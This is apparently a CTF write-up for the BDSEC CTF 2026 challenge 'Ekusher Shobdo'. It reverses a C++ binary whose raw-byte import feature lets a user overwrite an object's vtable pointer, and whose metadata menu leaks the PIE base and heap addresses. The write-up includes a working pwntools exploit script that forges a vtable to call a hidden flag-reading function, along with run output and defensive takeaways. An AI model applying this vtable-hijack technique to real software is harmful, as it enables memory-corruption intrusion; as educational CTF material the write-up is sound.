# Ekusher Shobdo — BDSEC CTF 2026

**Category:** Pwn / Reverse Engineering (C++ type confusion) **Points:** 175 **Author:** NomanProdhan **Flag:** `BDSEC{sh0bd0_k0kh0n0_b0nd1_th4k3_n4}`

---

## 1. Recon

```
$ file ekusher_shobdo
ELF 64-bit LSB pie executable, x86-64, stripped
RELRO: Full, Canary: yes, NX: enabled, PIE: enabled
```

Dynamic symbols reveal it's a C++ binary (`libstdc++`, `_ZdlPvm`/`operator delete`, RTTI type-info symbols). Running it shows an "archive terminal" menu:

```
1. Create record      6. Publish record
2. Edit record         7. Delete record
3. Reclassify record    8. List records
4. Display record        9. Exit
5. Inspect archive metadata
```

Four record types are creatable — Poem, Slogan, Notice, Broadcast — and the flavor text is the whole plot: _"Some words refuse to remain in the category assigned to them."_ This is a **type-confusion** challenge.

## 2. Reversing the object model

Every record is a classic Itanium-ABI polymorphic C++ object: a `new`'d heap block whose first 8 bytes are a **vtable pointer**, laid out as:

```
[vtable_ptr][... inline fields ...]
```

All four classes (Poem/Slogan/Notice/Broadcast) allocate **exactly the same size**: `operator new(0xa0)` — 160 bytes — regardless of type, differing only in which static vtable gets stored at offset 0 and how the remaining 152 bytes are subdivided into text fields. Extracting the four vtables from the PIE relocations gives each class's four virtual-function slots (`vptr+0x00`, `+0x08`, `+0x10`, `+0x18`).

Separately from the object itself, a **global slot array** (16 entries × 16 bytes: `{object_ptr, classification_tag}`) tracks which record is which "type" for menu purposes. Critically, **most menu operations dispatch on the slot's `classification_tag`, not the object's real vtable pointer** — except `Publish`, which always does genuine C++ virtual dispatch:

```c
Record* obj = slots[idx].ptr;
void** vtable = *(void***)obj;   // the REAL vtable, from object memory
vtable[1]();                      // call vfunc1 == "publish"
```

### 2.1 The fifth category

`Reclassify` (menu 3) lets you set a record's tag to any of five values — `1..4` are the normal types, but there's a legitimate **5th option: "Imported archive"**. No real C++ class backs this tag; it's purely a label. But `Edit` (menu 2) dispatches per-tag, and for tag `5` it doesn't run any of the normal field-editing code — it calls a special import routine that prompts:

```
Raw bytes (hex):
```

### 2.2 The bug: unrestricted raw object overwrite

Reversing that routine shows it:

1. Reads up to 384 hex characters.
2. Validates the string is well-formed hex (even count, only hex digits/whitespace), capped at `0x141` digits → **max 160 decoded bytes** — suspiciously exactly the object's allocation size.
3. Decodes each byte pair and writes it starting at **offset 0 of the object** — i.e., you can overwrite the _entire_ 160-byte object, **including its vtable pointer**, with attacker-chosen bytes, with zero validation that the result is a sane object.

Reclassifying any record to "Imported" and editing it therefore gives a **direct, size-bounded arbitrary write of a fake vtable pointer into a live polymorphic object.**

### 2.3 The leak

`Inspect archive metadata` (menu 5) prints, for any record:

```
classification=<name>
storage=<object heap pointer>
dispatch=<*(void**)object, i.e. the real vtable pointer>
```

This is a ready-made **PIE base leak** (vtable pointers are static offsets into the binary) **and heap pointer leak** — no separate infoleak bug needed to build one.

### 2.4 The win condition

Deep in the binary, unreferenced by any of the four real vtables, sits a function that does exactly:

```c
fd = open("flag.txt", O_RDONLY);
n  = read(fd, buf, 0xff);
close(fd);
write(1, buf, n);   // straight back over the connection
```

It's normal, valid, compiled code — it's just never wired into any legitimate vtable slot. It's the intended target of a forged vtable.

## 3. Exploit

**Step 1 — leak the PIE base.** Create a Poem record, `Inspect` it, read `dispatch=`. Poem's vtable sits at a known static offset in the binary, so:

```
base = dispatch - POEM_VTABLE_OFFSET
target_func = base + FLAG_LEAKER_OFFSET
```

**Step 2 — stage the target address in a "helper" record.** Create a second Poem, `Inspect` it to get its heap `storage` address, then reclassify it to Imported and overwrite its **first 8 bytes** with `target_func` (a minimal 16-hex-char write — the rest of the object is left untouched and never used again):

```
storageA[0:8] = target_func
```

**Step 3 — forge a victim's vtable pointer.** Create a third Poem, reclassify it to Imported, and overwrite its first 8 bytes with `storageA - 8`:

```
victim.vptr = storageA - 8
```

**Step 4 — Publish the victim.** `Publish` does `call [ [victim]+8 ]` = `call [ (storageA-8) + 8 ]` = `call [storageA]` = `call target_func` — the real, valid, compiled flag-reading function executes, using the object's stack-allocated buffer path (it ignores whatever "this" pointer it was implicitly called with), and writes the flag straight back over the socket.

### 3.1 Script

```python
from pwn import *
import re

POEM_VTABLE_OFFSET  = 0x4c08
TARGET_FUNC_OFFSET  = 0x1dd0

def menu(t, choice):
    t.sendline(str(choice).encode())

def create_poem(t):
    menu(t, 1); t.recvuntil(b'Type: '); t.sendline(b'1')
    idx = int(re.search(rb'(\d+)', t.recvuntil(b'\n')).group(1))
    t.recvuntil(b'> ')
    return idx

def inspect(t, idx):
    menu(t, 5); t.recvuntil(b'Record: '); t.sendline(str(idx).encode())
    out = t.recvuntil(b'> ').decode()
    storage  = int(re.search(r'storage=(0x[0-9a-fA-F]+)',  out).group(1), 16)
    dispatch = int(re.search(r'dispatch=(0x[0-9a-fA-F]+)', out).group(1), 16)
    return storage, dispatch

def reclassify_imported(t, idx):
    menu(t, 3); t.recvuntil(b'Record: '); t.sendline(str(idx).encode())
    t.recvuntil(b'New classification: '); t.sendline(b'5')
    t.recvuntil(b'> ')

def import_raw(t, idx, raw):
    menu(t, 2); t.recvuntil(b'Record: '); t.sendline(str(idx).encode())
    t.recvuntil(b'Raw bytes (hex): '); t.sendline(raw.hex().encode())
    t.recvuntil(b'> ')

def publish(t, idx):
    menu(t, 6); t.recvuntil(b'Record: '); t.sendline(str(idx).encode())

t = remote('45.56.67.129', 54821)
t.recvuntil(b'> ')

r0 = create_poem(t)
_, dispatch = inspect(t, r0)
base = dispatch - POEM_VTABLE_OFFSET
target_func = base + TARGET_FUNC_OFFSET

r1 = create_poem(t)
storageA, _ = inspect(t, r1)
reclassify_imported(t, r1)
import_raw(t, r1, p64(target_func))

r2 = create_poem(t)
reclassify_imported(t, r2)
import_raw(t, r2, p64(storageA - 8))

publish(t, r2)
print(t.recvuntil(b'> ').decode())
```

### 3.2 Run

```
[*] leaked base = 0x592bac47a000
[*] target func = 0x592bac47bdd0
[*] helper storage = 0x592bb294d360
[+] The language broadcast has been restored.
BDSEC{sh0bd0_k0kh0n0_b0nd1_th4k3_n4}
```

## 4. Flag

```
BDSEC{sh0bd0_k0kh0n0_b0nd1_th4k3_n4}
```

"শব্দ কখনো বন্দী থাকে না" — _a word is never held captive._ Fitting: the whole exploit is about a "word" (record) refusing to stay inside the category it was assigned, using that same freedom to smuggle a forged identity — and eventually a forged vtable — past the classifier.

## 5. Takeaways

- Any feature that lets you rewrite an object's **raw bytes without going through its constructor**, especially one whose size just happens to match the allocation exactly, is a vtable-hijack primitive waiting to happen in a polymorphic C++ binary — the vtable pointer is just the first 8 bytes of the object like any other field.
- A "debug"/"metadata" leak endpoint that prints both a heap pointer and a vtable pointer is doing half the exploit-dev work for you: PIE base and heap layout in one shot, no separate infoleak bug required.
- Dispatch-by-stored-tag vs. dispatch-by-real-vtable-pointer is an easy inconsistency to introduce in hand-rolled polymorphism, and exactly the kind of "two code paths, two truths" pattern worth grep-ing for in any custom object-model challenge.
- A function with no cross-references from any legitimate call site is worth a second look — in this binary it turned out to be the entire win condition, just waiting for a forged pointer to find it.

---

_Obito Uchiha — Team AKATSUKI_
